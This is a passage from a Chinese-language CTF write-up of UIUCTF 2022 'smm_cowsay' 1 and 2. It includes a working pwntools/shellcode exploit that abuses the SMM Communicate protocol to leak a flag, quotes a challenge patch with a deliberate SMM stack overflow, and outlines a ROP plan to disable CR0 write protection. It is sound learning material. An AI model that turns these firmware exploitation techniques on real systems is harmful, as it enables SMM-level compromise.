class="line">    .quad 8                                /* Buffer-&gt;MessageLength */</span><br><span class="line">    .quad 0x44440000                       /* Buffer-&gt;Data */</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是执行完报错了</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240831221813876.png" alt="image-20240831221813876"></p>
<p>从log输出可以看出，rip-shellcode运行的地址&#x3D;0x20，在ida里查看shellcode，发现走到了fail的分支</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240831223439155.png" alt="image-20240831223439155"></p>
<p>rax的返回值是0xf，看看错误代码可知对应的是EFI_ACCESS_DENIED。访问拒绝。communicate函数执行失败了。</p>
<h4 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h4><p>查看源码发现原因</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Communicates with a registered handler.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  This function provides a service to send and receive messages from a registered</span></span><br><span class="line"><span class="comment">  UEFI service.  This function is part of the SMM Communication Protocol that may</span></span><br><span class="line"><span class="comment">  be called in physical mode prior to SetVirtualAddressMap() and in virtual mode</span></span><br><span class="line"><span class="comment">  after SetVirtualAddressMap().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param[in] This                The EFI_SMM_COMMUNICATION_PROTOCOL instance.</span></span><br><span class="line"><span class="comment">  @param[in, out] CommBuffer     A pointer to the buffer to convey into SMRAM.</span></span><br><span class="line"><span class="comment">  @param[in, out] CommSize       The size of the data buffer being passed in. On exit, the size of data</span></span><br><span class="line"><span class="comment">                                 being returned. Zero if the handler does not wish to reply with any data.</span></span><br><span class="line"><span class="comment">                                 This parameter is optional and may be NULL.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @retval EFI_SUCCESS            The message was successfully posted.</span></span><br><span class="line"><span class="comment">  @retval EFI_INVALID_PARAMETER  The CommBuffer was NULL.</span></span><br><span class="line"><span class="comment">  @retval EFI_BAD_BUFFER_SIZE    The buffer is too large for the MM implementation.</span></span><br><span class="line"><span class="comment">                                 If this error is returned, the MessageLength field</span></span><br><span class="line"><span class="comment">                                 in the CommBuffer header or the integer pointed by</span></span><br><span class="line"><span class="comment">                                 CommSize, are updated to reflect the maximum payload</span></span><br><span class="line"><span class="comment">                                 size the implementation can accommodate.</span></span><br><span class="line"><span class="comment">  @retval EFI_ACCESS_DENIED      The CommunicateBuffer parameter or CommSize parameter,</span></span><br><span class="line"><span class="comment">                                 if not omitted, are in address range that cannot be</span></span><br><span class="line"><span class="comment">                                 accessed by the MM environment.</span></span><br><span class="line"><span class="comment">                                 #原因如上</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function">EFI_STATUS</span></span><br><span class="line"><span class="function">EFIAPI</span></span><br><span class="line"><span class="function"><span class="title">SmmCommunicationCommunicate</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN CONST EFI_SMM_COMMUNICATION_PROTOCOL  *This,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN OUT VOID                              *CommBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  IN OUT UINTN                             *CommSize OPTIONAL</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span>;</span><br></pre></td></tr></table></figure>

<p>CommunicateBuffer位于 MM 环境无法访问的地址范围内。无法访问的地址指什么呢？这个时候我们联想到我上一个博客总结的各种攻击手法的一个缓冲区检查的函数SmmIsBufferOutsideSmmValid。因为都是放在SMRAM缓冲区所以可以往这个方向联想。直接看源码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check override for Valid Communication Region</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (mSmmMemLibSmmReadyToLock) &#123;</span><br><span class="line">  EFI_MEMORY_DESCRIPTOR  *MemoryMap;</span><br><span class="line">  BOOLEAN                InValidCommunicationRegion;</span><br><span class="line"></span><br><span class="line">  InValidCommunicationRegion = FALSE;</span><br><span class="line">  MemoryMap                  = mMemoryMap;</span><br><span class="line">  <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; mMemoryMapEntryCount; Index++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((Buffer &gt;= MemoryMap-&gt;PhysicalStart) &amp;&amp;</span><br><span class="line">        (Buffer + Length &lt;= MemoryMap-&gt;PhysicalStart + <span class="built_in">LShiftU64</span> (MemoryMap-&gt;NumberOfPages, EFI_PAGE_SHIFT)))</span><br><span class="line">    &#123;</span><br><span class="line">      InValidCommunicationRegion = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    MemoryMap = <span class="built_in">NEXT_MEMORY_DESCRIPTOR</span> (MemoryMap, mDescriptorSize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!InValidCommunicationRegion) &#123;</span><br><span class="line">    <span class="built_in">DEBUG</span> ((</span><br><span class="line">      DEBUG_ERROR,</span><br><span class="line">      <span class="string">&quot;SmmIsBufferOutsideSmmValid: Not in ValidCommunicationRegion: Buffer (0x%lx) - Length (0x%lx)\n&quot;</span>,</span><br><span class="line">      Buffer,</span><br><span class="line">      Length</span><br><span class="line">      ));</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这一段就是原因，他规定了buffer的地址需要在某个范围之内，不然就是Not in ValidCommunicationRegion。我们是在执行shellcode的位置执行的，这可能意味着此地址在MM环境无法访问的地址范围。那原程序执行时地址是哪儿来的呢？查看patches文件可以得知，是库函数分配给它的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span><br><span class="line">+</span><br><span class="line">+  Buffer = <span class="built_in">AllocateRuntimeZeroPool</span>(<span class="built_in">sizeof</span>(*Buffer) + <span class="built_in">sizeof</span>(CHAR16 *));</span><br><span class="line">+  <span class="keyword">if</span> (!Buffer)</span><br><span class="line">+    <span class="keyword">return</span>;</span><br><span class="line">+</span><br><span class="line">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">+  Buffer-&gt;MessageLength = <span class="built_in">sizeof</span>(CHAR16 *);</span><br><span class="line">+  *(CONST CHAR16 **)&amp;Buffer-&gt;Data = Message;</span><br><span class="line">+</span><br><span class="line">+  mSmmCommunication-&gt;<span class="built_in">Communicate</span>(</span><br><span class="line">+    mSmmCommunication,</span><br><span class="line">+    Buffer,</span><br><span class="line">+    <span class="literal">NULL</span></span><br><span class="line">+  );</span><br></pre></td></tr></table></figure>

<p>要学就努力学懂。接着查看AllocateRuntimeZeroPool的源码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Allocates and zeros a buffer of type EfiRuntimeServicesData. &lt;======分配的data的类型</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Allocates the number bytes specified by AllocationSize of type EfiRuntimeServicesData, clears the</span></span><br><span class="line"><span class="comment">  buffer with zeros, and returns a pointer to the allocated buffer.  If AllocationSize is 0, then a</span></span><br><span class="line"><span class="comment">  valid buffer of 0 size is returned.  If there is not enough memory remaining to satisfy the</span></span><br><span class="line"><span class="comment">  request, then NULL is returned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param  AllocationSize        The number of bytes to allocate and zero.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @return A pointer to the allocated buffer or NULL if allocation fails.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function">VOID *</span></span><br><span class="line"><span class="function">EFIAPI</span></span><br><span class="line"><span class="function"><span class="title">AllocateRuntimeZeroPool</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  IN UINTN  AllocationSize</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">InternalAllocateZeroPool</span> (EfiRuntimeServicesData, AllocationSize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看EfiRuntimeServicesData文档</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240831230648232.png" alt="image-20240831230648232"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已加载的 UEFI 运行时驱动程序的数据部分,以及 UEFI 运行时驱动程序用于分配池内存的默认数据分配类型。</span><br></pre></td></tr></table></figure>

<p>默认分配的类型就是这个。如果用这个分配的数据对应的地址肯定是被信任的地址。</p>
<p>我们没法用已有的东西直接调用AllocateRuntimeZeroPool，但是我们可以用类似的函数替代。BootServices-&gt;AllocatePool()和BootServices-&gt;AllocatePages()都行。只要分配的类型是EfiRuntimeServicesData就行。此处使用BootServices-&gt;AllocatePool()进行分配。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(conn.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Allocated buffer @ 0x%x&#x27;</span>, buffer)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x20</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 8                                /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0x44440000                       /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(code.<span class="built_in">hex</span>().encode())</span><br><span class="line">conn.sendline(<span class="string">b&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>AllocatePool最开始的时候获取一下就行了。运行后得到部分flag。因为flag存储是UTF-16，所以它取数据是一次跳2byte取的。只需要地址加1即可获得所有flag。</p>
<p><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240831231555050.png" alt="image-20240831231555050"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本上是复现，但是把很多没提到的东西都深入的研究了，也没有硬复现而是看一部分然后基于当前部分想后面做法后再去查看思路。非常非常好的题目，学到非常多。</p>
<h1 id="UIUCTF-2022-smm-cowsay-2"><a href="#UIUCTF-2022-smm-cowsay-2" class="headerlink" title="UIUCTF 2022-smm_cowsay_2"></a>UIUCTF 2022-smm_cowsay_2</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>We asked that engineer to fix the issue, but I think he may have left a backdoor disguised as debugging code.</p>
<h2 id="总览-1"><a href="#总览-1" class="headerlink" title="总览"></a>总览</h2><p>文件结构和cowsay1的一模一样。运行后和cowsay1一样的输出，也有system table和shellcode地址。直接看patches文件吧。</p>
<p>差别的话，首先edk2的5文件里把页表都开了读保护，不像上一道题rwx都开了。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">+</span><br><span class="line">+  <span class="comment">// Flag must not be seen</span></span><br><span class="line">+  <span class="built_in">SmmSetMemoryAttributes</span> (</span><br><span class="line">+    <span class="number">0x44440000</span>,</span><br><span class="line">+    <span class="built_in">EFI_PAGES_TO_SIZE</span>(<span class="number">1</span>),</span><br><span class="line">+    EFI_MEMORY_RP</span><br><span class="line">+    );</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">diff --git a/UefiCpuPkg/PiSmmCpuDxeSmm/X64/PageTbl.c b/UefiCpuPkg/PiSmmCpuDxeSmm/X64/PageTbl.c</span></span><br><span class="line"><span class="comment">index 538394f239..0e5a6bf94b 100644</span></span><br><span class="line"><span class="comment">--- a/UefiCpuPkg/PiSmmCpuDxeSmm/X64/PageTbl.c</span></span><br><span class="line"><span class="comment">+++ b/UefiCpuPkg/PiSmmCpuDxeSmm/X64/PageTbl.c</span></span><br><span class="line"><span class="comment">@@ -1172,6 +1172,16 @@ SmiPFHandler (</span></span><br><span class="line"><span class="comment">       CpuDeadLoop ();</span></span><br><span class="line"><span class="comment">       goto Exit;</span></span><br><span class="line"><span class="comment">     &#125;</span></span><br><span class="line"><span class="comment">+</span></span><br><span class="line"><span class="comment">+    if ((PFAddress &gt;= 0x44440000 &amp;&amp; PFAddress &lt; 0x44440000 + EFI_PAGES_TO_SIZE(1))) &#123;</span></span><br><span class="line"><span class="comment">+      DumpCpuContext (InterruptType, SystemContext);</span></span><br><span class="line"><span class="comment">+      DEBUG ((DEBUG_ERROR, &quot;Access to flag forbidden (0x%lx)!\n&quot;, PFAddress));</span></span><br><span class="line"><span class="comment">+      DEBUG_CODE (</span></span><br><span class="line"><span class="comment">+        DumpModuleInfoByIp ((UINTN)SystemContext.SystemContextX64-&gt;Rip);</span></span><br><span class="line"><span class="comment">+      );</span></span><br><span class="line"><span class="comment">+      CpuDeadLoop ();</span></span><br><span class="line"><span class="comment">+      goto Exit;</span></span><br><span class="line"><span class="comment">+    &#125;</span></span><br><span class="line"><span class="comment">   &#125;</span></span><br></pre></td></tr></table></figure>

<p>binexec里的cowsay基本没改</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">+VOID</span><br><span class="line">+<span class="built_in">Cowsay</span> (</span><br><span class="line">+  IN CONST CHAR16 *Message</span><br><span class="line">+  )</span><br><span class="line">+&#123;</span><br><span class="line">+  EFI_SMM_COMMUNICATE_HEADER *Buffer;</span><br><span class="line">+  UINTN MessageLen = <span class="built_in">StrLen</span>(Message) * <span class="built_in">sizeof</span>(CHAR16);</span><br><span class="line">+</span><br><span class="line">+  Buffer = <span class="built_in">AllocateRuntimeZeroPool</span>(<span class="built_in">sizeof</span>(*Buffer) + MessageLen);</span><br><span class="line">+  <span class="keyword">if</span> (!Buffer)</span><br><span class="line">+    <span class="keyword">return</span>;</span><br><span class="line">+</span><br><span class="line">+  Buffer-&gt;HeaderGuid = gEfiSmmCowsayCommunicationGuid;</span><br><span class="line">+  Buffer-&gt;MessageLength = MessageLen;</span><br><span class="line">+  <span class="built_in">CopyMem</span>(Buffer-&gt;Data, Message, MessageLen);</span><br><span class="line">+</span><br><span class="line">+  mSmmCommunication-&gt;<span class="built_in">Communicate</span>(</span><br><span class="line">+    mSmmCommunication,</span><br><span class="line">+    Buffer,</span><br><span class="line">+    <span class="literal">NULL</span></span><br><span class="line">+  );</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">FreePool</span>(Buffer);</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>

<p>但是SmmCowsay里面代码发生了改变</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">+EFI_STATUS</span><br><span class="line">+EFIAPI</span><br><span class="line">+<span class="built_in">SmmCowsayHandler</span> (</span><br><span class="line">+  IN EFI_HANDLE  DispatchHandle,</span><br><span class="line">+  IN CONST VOID  *Context         OPTIONAL,</span><br><span class="line">+  IN OUT VOID    *CommBuffer      OPTIONAL,</span><br><span class="line">+  IN OUT UINTN   *CommBufferSize  OPTIONAL</span><br><span class="line">+  )</span><br><span class="line">+&#123;</span><br><span class="line">+  EFI_STATUS Status;</span><br><span class="line">+  UINTN TempCommBufferSize;</span><br><span class="line">+  UINT64 Canary;</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">DEBUG</span> ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Enter\n&quot;</span>));</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (!CommBuffer || !CommBufferSize)</span><br><span class="line">+    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">+</span><br><span class="line">+  TempCommBufferSize = *CommBufferSize;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (!<span class="built_in">AsmRdRand64</span>(&amp;Canary))</span><br><span class="line">+    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">+  mDebugData.Canary = Canary;</span><br><span class="line">+</span><br><span class="line">+  Status = <span class="built_in">SmmCopyMemToSmram</span>(mDebugData.Message, CommBuffer, TempCommBufferSize); &lt;==========一眼栈溢出</span><br><span class="line">+  <span class="keyword">if</span> (<span class="built_in">EFI_ERROR</span>(Status))</span><br><span class="line">+    <span class="keyword">goto</span> out;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (mDebugData.Canary != Canary) &#123; &lt;===========检查canary</span><br><span class="line">+    <span class="comment">// We probably overrun into libraries. Don&#x27;t trust anything. Make triple fault here.</span></span><br><span class="line">+    <span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">+      __asm__ __volatile__ (</span><br><span class="line">+        <span class="string">&quot;push $0\n&quot;</span></span><br><span class="line">+        <span class="string">&quot;push $0\n&quot;</span></span><br><span class="line">+        <span class="string">&quot;lidt (%%rsp)\n&quot;</span></span><br><span class="line">+        <span class="string">&quot;add $16,%%rsp\n&quot;</span></span><br><span class="line">+        <span class="string">&quot;ud2\n&quot;</span></span><br><span class="line">+        : : : <span class="string">&quot;memory&quot;</span></span><br><span class="line">+      );</span><br><span class="line">+    &#125;</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">if</span> (mDebugData.Icebp) &#123;  &lt;===========检查</span><br><span class="line">+    <span class="comment">// If you define WANT_ICEBP in QEMU you actually get a breakpoint right here.</span></span><br><span class="line">+    <span class="comment">// Have fun playing with SMM.  &lt;=========可以用来打smm的断点</span></span><br><span class="line">+    __asm__ __volatile__ (</span><br><span class="line">+      <span class="string">&quot;.byte 0xf1&quot;</span> <span class="comment">// icebp / int1</span></span><br><span class="line">+      : : : <span class="string">&quot;memory&quot;</span></span><br><span class="line">+    );</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="built_in">SetMem</span>(mDebugData.Message, <span class="built_in">sizeof</span>(mDebugData.Message), <span class="number">0</span>); &lt;===========清零</span><br><span class="line">+</span><br><span class="line">+  mDebugData.<span class="built_in">CowsayFunc</span>(CommBuffer, TempCommBufferSize); &lt;===========cowsay函数调用</span><br><span class="line">+</span><br><span class="line">+out:</span><br><span class="line">+  <span class="built_in">DEBUG</span> ((DEBUG_INFO, <span class="string">&quot;SmmCowsay SmmCowsayHandler Exit\n&quot;</span>));</span><br><span class="line">+</span><br><span class="line">+  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>

<p>比较明显的一个栈溢出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);</span><br></pre></td></tr></table></figure>

<p>commbuffer再次没做长度检查。此处mDebugData的结构体如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+<span class="keyword">struct</span> &#123;</span><br><span class="line">+  CHAR16 Message[<span class="number">200</span>];</span><br><span class="line">+  <span class="function">VOID <span class="title">EFIAPI</span> <span class="params">(* <span class="keyword">volatile</span> CowsayFunc)</span><span class="params">(IN CONST CHAR16 *Message, IN UINTN MessageLen)</span></span>;</span><br><span class="line">+  BOOLEAN <span class="keyword">volatile</span> Icebp;</span><br><span class="line">+  UINT64 <span class="keyword">volatile</span> Canary;</span><br><span class="line">+&#125; mDebugData;</span><br><span class="line">+</span><br></pre></td></tr></table></figure>

<p>输入400byte数据后可以溢出到后面的成员变量。后面甚至是被初始化成cowsay的函数指针。首先想到的就是构造ROP链，设置cr0寄存器把页表的写保护关掉，把flag区域的读保护关掉，然后读取。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://uefi.org/specs/UEFI/2.9_A">https://uefi.org/specs/UEFI/2.9_A</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/">https://github.com/tianocore/edk2/</a></p>
<p><a target="_blank" rel="noopener" href="https://pagabuc.me/blog/smm-cowsay-1-and-2-uiuctf-2022">https://pagabuc.me/blog/smm-cowsay-1-and-2-uiuctf-2022</a></p>
